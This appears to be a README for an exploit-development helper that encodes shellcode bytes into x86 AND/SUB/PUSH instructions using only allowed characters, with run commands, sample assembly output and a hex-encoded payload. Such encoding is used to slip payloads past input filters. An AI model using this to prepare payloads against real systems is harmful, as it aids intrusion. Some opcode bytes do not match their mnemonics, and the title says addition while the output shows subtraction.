# Shellcode Encoding by Adddition
Takes an `shellcode` list of bytes and looks within the `allowedCharacters` list for substions using **addition** in assembly. The script will generate the assembly instructions as well as a raw payload.

For example:

> We want to find a subsution for byte `8B` in our shellcode. Within the allowed set of bytes such as `0C` and `7F`.

It's worth nothing that this technique will *greatly increase the size of the payload*. The original payload is **32 bytes** where the final payload is **178 bytes**.

## Running the Script
Open the script and modify the `shellcode` and `allowedCharacters` lists, then run the in Python and wait for output in `output.txt`:

```bash
python2.7 shellcode_encoder.py
```

Or if you use Docker:

```bash
docker run -it --rm --name my-running-script -v "$PWD":/usr/src/myapp -w /usr/src/myapp python:2 python shellcode_encoder.py
```

The output will look as follows:

```text
[#] Size of shellcode 32 bytes
[#] Allowed characters: 121
[#] Searching for bytes to clear EAX: ('01', '02')
[#] Calculating required subtractions...
[#] Performing encoding for 8 sets of bytes...
[+] Encoding: 0x1800188B
	0x17	=	14 + 02 + 01
	0x100	=	7f + 7e + 03
	0x18	=	15 + 02 + 01
	0x8b	=	7f + 0b + 01
[+] Encoding: 0x50158A51
	0x50	=	4f + 01
	0x15	=	14 + 01
	0x8a	=	7f + 0b
	0x51	=	50 + 01

... snipped ...

[#] Creating ASM instructions...
25 10101010		AND EAX, 01010101	 ; Zero out EAX
25 20202020		AND EAX, 02020202	 ; Zero out EAX
2D 7F157F14		SUB EAX, 7F157F14	 ; Carving out byte
2D 0B027E02		SUB EAX, 0B027E02	 ; Carving out byte
2D 01010301		SUB EAX, 01010301	 ; Carving out byte
50			PUSH EAX		 ; Save to stack

25 10101010		AND EAX, 01010101	 ; Zero out EAX
25 20202020		AND EAX, 02020202	 ; Zero out EAX
2D 507F144F		SUB EAX, 507F144F	 ; Carving out byte
2D 010B0101		SUB EAX, 010B0101	 ; Carving out byte
50			PUSH EAX		 ; Save to stack

... snipped ...
```

The `output.txt` file will then show the encoded bytes:

```text
251010101025202020202D7F157F142D0B027E022D0101030150251010101025202020202D507F144F2D010B010150251010101025202020202D7F7F73042D120E010150251010101025202020202D10467F7F2D01010C1850251010101025202020202D7F7F7F7F2D457B260C50251010101025202020202D7F7F317F2D7F28015250251010101025202020202D7F7F7F7F2D723E2E1650251010101025202020202D7F7B327F2D1A02027E2D0101010350
```
